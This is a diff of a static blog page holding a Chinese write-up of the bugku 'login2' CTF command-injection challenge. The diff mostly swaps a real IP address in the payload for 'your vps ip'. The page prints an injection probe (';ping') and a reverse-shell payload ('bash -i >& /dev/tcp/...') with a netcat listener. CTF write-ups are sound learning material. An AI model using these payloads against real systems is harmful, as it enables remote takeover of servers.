@@ -17,7 +17,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/1.bmp">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/2.bmp">
-<meta property="og:updated_time" content="2018-07-13T06:53:07.032Z">
+<meta property="og:updated_time" content="2018-07-13T07:04:39.980Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku-login2-witeup">
 <meta name="twitter:description" content="前言这是一道命令注入的题目，需要用到vps，所以第一次遇到这道题目时没有做出来，由于前两天刚刚买了一台vps，所以马上把这道题翻出来做。 登录首先打开题目是一个登录框，题目提示有union，且在页面返回的响应头有一个tip，base64解码后的内容为">
@@ -193,7 +193,7 @@
 </ul>
 <p>发现浏览器进行了延迟，也就是进行了命令执行<br>再试一下能否ping外网<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;ping www.baidu.com</span></span><br></pre></td></tr></table></figure></p>
 <p>浏览器同样延迟执行，说明ping成功</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span>;bash -i &gt;&amp; /dev/tcp/<span class="number">74.82</span><span class="number">.197</span><span class="number">.141</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">nc -l -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span>;bash -i &gt;&amp; /dev/tcp/your vps ip/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">nc -l -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
 <p>这里遇到了玄学之处，在hackbar里面使用一摸一样的payload就不行，而在执行框里面点击执行就可以<br>原因是hackerbar在post数据的时候不会进行url编码</p>
 <ul>
 <li>原理<br><a href="https://segmentfault.com/a/1190000010975294" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010975294</a></li>
